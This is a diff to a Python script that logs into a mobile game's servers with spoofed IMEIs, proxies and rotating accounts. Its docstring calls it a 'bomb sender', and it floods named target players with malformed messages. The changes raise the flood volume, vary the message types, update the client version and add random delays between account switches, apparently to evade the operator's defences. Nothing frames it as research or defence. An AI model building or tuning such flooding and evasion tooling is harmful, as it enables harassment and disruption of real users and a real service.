@@ -37,7 +37,7 @@ async def user_do(username, imei, passwd='V0\/wJekk6Kk=', proxy=None):
             assert r["code"] == 100
     return r['uid'], r['token']
 
-async def login_verify(user_id, token, version='1.4.58672', proxy=None):
+async def login_verify(user_id, token, version='1.5.60090', proxy=None):
     # return tcp session
     url = 'http://sgz-login.fingerfunol.com:30006/entry_server/login_verify?version=%s&server_id=20&userid=%s&channel=4&session=%s&platform=a8card&isdebug=False&activation_code=' % (version, user_id, token)
     async with aiohttp.ClientSession() as session:
@@ -56,7 +56,7 @@ async def one(email, targets, wait=0):
     """maintance one bomb sender"""
     proxies = get_proxies()
     imei = "".join(str(random.randint(0,9)) for x in range(1, len("863272039030961")+1))
-    version = "1.4.58672"
+    version = "1.5.60090"
     uid, token, session = None, None, None
     # session_manager = Session(email)
     while True:
@@ -109,14 +109,14 @@ async def one(email, targets, wait=0):
             while True:
                 for receiver in targets:
                     writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
-                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
-                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
-                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
-                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
-                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 3))
-                    await asyncio.sleep(1)
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 4))
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 5))
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 6))
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 7))
+                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 8))
+                    await asyncio.sleep(0.5)
                     i += 1
-                    if i % 5 == 0:
+                    if i % 20 == 0:
                         writer.write(b'\x00\x00\x00\x02\x01\x00')
                     await reader.read(1024)
                     #if i % 30 == 0:
@@ -138,12 +138,13 @@ async def one(email, targets, wait=0):
             c.execute("SELECT email FROM guards ORDER BY RANDOM() LIMIT 1")
             email = c.fetchone()[0]
             print("change to:", email)
+            await asyncio.sleep(random.randint(60,120))
             # session_manager.delete_session(email)
             # uid = token = session = None
         except:
             import traceback
             print("wtf!!!!", traceback.format_exc())
-            await asyncio.sleep(random.randint(10,30))
+            await asyncio.sleep(random.randint(20,60))
 
 
 async def count_down(sec):
